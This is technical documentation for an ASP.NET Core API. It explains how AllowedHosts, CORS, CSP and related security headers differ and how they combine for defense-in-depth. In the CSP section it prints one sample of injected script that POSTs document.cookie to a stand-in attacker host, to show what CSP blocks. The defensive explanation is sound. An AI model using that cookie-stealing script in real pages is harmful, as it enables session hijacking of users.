# Security Configuration Comparison Guide

[← Back to README](../README.md)

## Table of Contents

- [Overview](#overview)
- [Quick Comparison Table](#quick-comparison-table)
- [Detailed Comparison](#detailed-comparison)
- [When Each Applies](#when-each-applies)
- [Overlap Analysis](#overlap-analysis)
- [How They Work Together](#how-they-work-together)
- [Configuration Summary](#configuration-summary)
- [Summary](#summary)
- [References](#references)

---

## Overview

This guide explains the differences between AllowedHosts, CORS, CSP and the other security headers in the GSS API: what each does, when it applies, and whether they overlap.

The GSS API uses multiple security mechanisms that operate at different layers and protect against different threats. Understanding the differences helps avoid confusion and ensures proper configuration.

**Key Security Configurations:**

1. **AllowedHosts** - Validates the `Host` header in **incoming requests**
2. **CORS (`ApiPipeline:Cors`)** - Controls **cross-origin requests** from browsers
3. **CSP (Content-Security-Policy)** - Controls **resource loading** in browsers and prevents clickjacking via `frame-ancestors` directive
4. **Other Security Headers** - Various response headers for additional protection

**Important:** These mechanisms operate at **different layers** and protect against **different threats**. They complement each other but do **not overlap** in their primary functions.

## Quick Comparison Table

| Security Mechanism | Type | When Applied | What It Protects | Configuration Location |
|-------------------|------|--------------|------------------|----------------------|
| **AllowedHosts** | Request validation | Server-side, before processing | Host header injection, cache poisoning | `appsettings.json` → `AllowedHosts` |
| **CORS** | Request/Response headers | Browser + Server | Cross-origin request blocking | `appsettings.json` → `ApiPipeline:Cors` |
| **CSP** | Response header | Browser (client-side) | XSS attacks, resource loading, clickjacking (via `frame-ancestors`) | ApiPipeline.NET security headers (`ApiPipeline:SecurityHeaders`) |

## Detailed Comparison

### 1. AllowedHosts

**What it is:**

- Server-side validation of the `Host` HTTP header in incoming requests
- Built into ASP.NET Core framework
- Validates **before** request is processed

**What it protects:**

- Host header injection attacks
- Cache poisoning
- Password reset poisoning
- Open redirect vulnerabilities

**When it applies:**

- ✅ **Server-side** - Before request processing
- ✅ **All requests** - HTTP/HTTPS, any client
- ❌ **Not browser-specific** - Works for all clients (browsers, mobile apps, API clients)

**Configuration:**

```json
{
  "AllowedHosts": "api.example.com;www.api.example.com"
}
```

**Example:**

```http
GET /api/v1/mis/divisions HTTP/1.1
Host: evil.com  ← Validated against AllowedHosts
```

If `evil.com` is not in `AllowedHosts`, server returns `400 Bad Request`.

**Key Point:** This is **server-side request validation**, not a response header.

---

### 2. CORS (`ApiPipeline:Cors`)

**What it is:**

- Cross-Origin Resource Sharing - Controls which origins can make cross-origin requests
- Browser-enforced security mechanism
- Uses both request headers (from browser) and response headers (from server)

**What it protects:**

- Unauthorized cross-origin requests
- Data leakage to untrusted origins
- CSRF attacks (when combined with other measures)

**When it applies:**

- ✅ **Browser requests** - Only enforced by browsers
- ✅ **Cross-origin requests** - Same-origin requests are not affected
- ❌ **Not for server-to-server** - API-to-API calls are not affected
- ❌ **Not for mobile apps** - Native mobile apps are not affected

**Configuration:**

```json
{
  "ApiPipeline": {
    "Cors": {
      "Enabled": true,
      "AllowedOrigins": ["https://frontend.example.com"],
      "AllowedMethods": ["GET", "POST"],
      "AllowedHeaders": ["Authorization", "Content-Type"],
      "AllowCredentials": false
    }
  }
}
```

**Example:**

```javascript
// Frontend at https://frontend.example.com
fetch('https://api.example.com/api/v1/mis/divisions', {
  headers: { 'Authorization': 'Bearer token' }
})
```

Browser checks CORS policy:

- Is `https://frontend.example.com` in `AllowedOrigins`? ✅
- Is `GET` in `AllowedMethods`? ✅
- Is `Authorization` in `AllowedHeaders`? ✅
- Request allowed → Browser sends request

**Key Point:** This is **browser-enforced** and only affects **cross-origin browser requests**.

---

### 3. CSP (Content-Security-Policy)

**What it is:**

- Response header that tells browsers which resources can be loaded
- Browser-enforced security mechanism
- Controls script execution, resource loading, iframe embedding

**What it protects:**

- XSS (Cross-Site Scripting) attacks
- Code injection attacks
- Clickjacking (via `frame-ancestors` directive)
- Unauthorized resource loading

**When it applies:**

- ✅ **Browser responses** - Only enforced by browsers
- ✅ **HTML content** - Primarily for HTML pages
- ⚠️ **JSON APIs** - Less critical, but still recommended
- ❌ **Not for server-to-server** - API-to-API calls are not affected

**Configuration:**

Written on every response by ApiPipeline.NET's security headers phase. Default `default-src 'none'; frame-ancestors 'none'`; override with `ApiPipeline:SecurityHeaders:ContentSecurityPolicy`. Swagger UI gets its own policy on `/swagger` (see [API Request Pipeline](api-pipeline.md#security-headers-and-csp)).

**Example:**

```html
<!-- Malicious script in API response -->
<script>
  fetch('https://evil.com/steal', {method: 'POST', body: document.cookie});
</script>
```

Browser checks CSP:

- The default `default-src 'none'` allows no scripts and no connections (`connect-src` falls back to it) ❌
- Script blocked → Attack prevented

**Key Point:** This is a **response header** that browsers enforce on **client-side resource loading**. The `frame-ancestors` directive in CSP provides clickjacking protection and complements the legacy `X-Frame-Options` header, which ApiPipeline.NET also sends (`DENY`).

---

## When Each Applies

### Request Flow

```text
1. Client sends request
   ↓
2. [AllowedHosts] ← Validates Host header (SERVER-SIDE)
   ↓
3. Server processes request
   ↓
4. Server sends response with headers:
   - CORS headers (Access-Control-Allow-Origin, etc.)
   - CSP header (Content-Security-Policy with frame-ancestors)
   ↓
5. Browser receives response
   ↓
6. [CORS] ← Browser checks if cross-origin request is allowed (BROWSER-SIDE)
   ↓
7. [CSP] ← Browser enforces resource loading policy and clickjacking protection (BROWSER-SIDE)
```

### Key Differences

| Mechanism | Applied By | When | Affects |
|-----------|-----------|------|---------|
| **AllowedHosts** | Server | Before request processing | All clients (browsers, mobile, API) |
| **CORS** | Browser | During cross-origin request | Browser requests only |
| **CSP** | Browser | When loading resources and embedding in iframes | Browser responses only |

## Overlap Analysis

### ❌ **No Direct Overlap**

These security mechanisms operate at **different layers** and protect against **different threats**:

1. **AllowedHosts** = Server-side request validation
2. **CORS** = Browser-side cross-origin request control
3. **CSP** = Browser-side resource loading control and clickjacking protection (via `frame-ancestors`)

### ⚠️ **Potential Confusion Areas**

#### 1. **CORS `AllowedOrigins` vs CSP `connect-src`**

**Overlap:** No, but can be confusing

- **CORS `AllowedOrigins`**: Which origins can **make requests** to your API
- **CSP `connect-src`**: Which URLs the **frontend application** can connect to (affects frontend, not API)

**Example:**

```json
// CORS: Frontend at https://frontend.com can call API
{
  "ApiPipeline": { "Cors": { "AllowedOrigins": ["https://frontend.com"] } }
}
```

```csharp
// CSP: Frontend can only make requests to 'self' (itself)
// frontend/gateway example, not code in this API
context.Response.Headers.Append("Content-Security-Policy",
    "connect-src 'self'");
```

**Key Point:** CORS controls **incoming requests to API**, CSP `connect-src` controls **outgoing requests from frontend**.

#### 2. **AllowedHosts vs CORS `AllowedOrigins`**

**Overlap:** No, completely different

- **AllowedHosts**: Validates the `Host` header in the request (server-side)
- **CORS `AllowedOrigins`**: Controls which origins can make cross-origin requests (browser-side)

**Example:**

```http
# Request from frontend at https://frontend.com
GET /api/v1/mis/divisions HTTP/1.1
Host: api.example.com          ← Validated by AllowedHosts
Origin: https://frontend.com    ← Validated by CORS
```

- **AllowedHosts** checks: Is `api.example.com` allowed? ✅
- **CORS** checks: Is `https://frontend.com` in `AllowedOrigins`? ✅

**Key Point:** They validate **different headers** (`Host` vs `Origin`) at **different layers** (server vs browser).

#### 3. **CSP `frame-ancestors` for Clickjacking Protection**

**Note:** CSP's `frame-ancestors` directive is the modern replacement for the legacy `X-Frame-Options` header. ApiPipeline.NET sends both by default: `frame-ancestors 'none'` in the CSP and `X-Frame-Options: DENY` for older browsers.

**Key Point:** `frame-ancestors 'none'` prevents iframe embedding and provides clickjacking protection.

## How They Work Together

These security mechanisms **complement each other** to provide **defense-in-depth**:

### Defense Layers

```text
Layer 1: AllowedHosts (Server-Side)
  ↓
  Protects: Host header injection, cache poisoning
  ↓
Layer 2: CORS (Browser-Side)
  ↓
  Protects: Unauthorized cross-origin requests
  ↓
Layer 3: CSP (Browser-Side)
  ↓
  Protects: XSS attacks, unauthorized resource loading, clickjacking (via frame-ancestors)
```

### Example Attack Scenario

**Attack:** Attacker tries to embed API in iframe and inject malicious script

**Defense:**

1. **AllowedHosts**: ✅ Validates `Host` header (prevents host header injection)
2. **CORS**: ✅ Blocks cross-origin requests from untrusted origins
3. **CSP**: ✅ Blocks malicious script execution and prevents iframe embedding (clickjacking protection)

**Result:** Attack blocked at multiple layers

## Configuration Summary

### Current Configuration in `appsettings.json`

```json
{
  // 1. AllowedHosts - Server-side Host header validation
  "AllowedHosts": "*",  // Should be specific hostnames in production

  "ApiPipeline": {
    // 2. CORS - Browser-side cross-origin request control (allow-all only in Development)
    "Cors": {
      "Enabled": true,
      "AllowAllInDevelopment": true,
      "AllowedOrigins": [ "https://your-production-domain.com", "https://www.your-production-domain.com" ],
      "AllowedMethods": [ "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS" ],
      "AllowedHeaders": [ "*" ],
      "AllowCredentials": false,
      "PreflightMaxAge": "01:00:00"
    }
    // 3. CSP and the other security headers - ApiPipeline.NET defaults, no section needed
  }
}
```

### Recommended Complete Configuration

#### 1. AllowedHosts (appsettings.json)

```json
{
  "AllowedHosts": "api.example.com;www.api.example.com"
}
```

**Purpose:** Server-side Host header validation

#### 2. CORS (appsettings.json)

Set the real front-end origins per environment, for example `ApiPipeline__Cors__AllowedOrigins__0=https://frontend.example.com`. Origins must be exact (`scheme://host[:port]`); a trailing slash, path, default port or wildcard pattern fails startup.

**Purpose:** Browser-side cross-origin request control

#### 3. CSP

On by default (`default-src 'none'; frame-ancestors 'none'`). Nothing to add for a JSON API.

**Purpose:** Browser-side resource loading control and clickjacking protection (via `frame-ancestors` directive)

## Summary

### Key Takeaways

1. **No Direct Overlap**: These mechanisms operate at different layers and protect against different threats
2. **Complementary**: They work together to provide defense-in-depth
3. **Different Layers**:
   - **Server-side**: AllowedHosts
   - **Browser-side**: CORS, CSP
4. **Different Headers**:
   - **AllowedHosts**: Validates `Host` header
   - **CORS**: Uses `Origin` header (request) and `Access-Control-Allow-Origin` (response)
   - **CSP**: Response header `Content-Security-Policy` (includes `frame-ancestors` for clickjacking protection)

### Configuration Checklist

- ✅ **AllowedHosts**: Configure specific hostnames (not `"*"` in production)
- ✅ **CORS**: Configure `AllowedOrigins` for frontend domains
- ✅ **CSP**: On by default from ApiPipeline.NET (`frame-ancestors 'none'`)
- ✅ **Other Headers**: `X-Content-Type-Options`, `Referrer-Policy`, `X-Frame-Options`, `Cross-Origin-Resource-Policy` and HSTS (HTTPS requests only, never in Development) are on by default from ApiPipeline.NET

### No Conflicts

These configurations **do not conflict** with each other. They can and should all be used together for maximum security.

## References

- [ASP.NET Core Host Filtering](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel/host-filtering)
- [ASP.NET Core CORS](https://learn.microsoft.com/en-us/aspnet/core/security/cors)
- [MDN Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
